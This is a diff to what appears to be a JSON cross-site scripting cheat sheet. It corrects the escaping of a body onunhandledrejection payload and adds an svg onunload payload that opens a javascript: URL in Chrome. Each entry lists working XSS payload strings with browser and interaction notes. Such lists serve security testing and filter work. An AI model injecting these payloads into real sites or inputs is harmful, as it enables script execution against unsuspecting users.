@@ -63985,11 +63985,24 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\\\/script>",
+                "code": "<body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\/script>",
                 "browsers": [
                     "firefox"
                 ],
                 "interaction": false
+            }
+        ]
+    },
+    "onunload": {
+        "description": "Requires a click anywhere on the page and a reload",
+        "tags": [
+            {
+                "tag": "svg",
+                  "code": "<svg onunload=window.open('javascript:alert(1)')>",
+                "browsers": [
+                    "chrome"
+                ],
+                "interaction": true
             }
         ]
     },
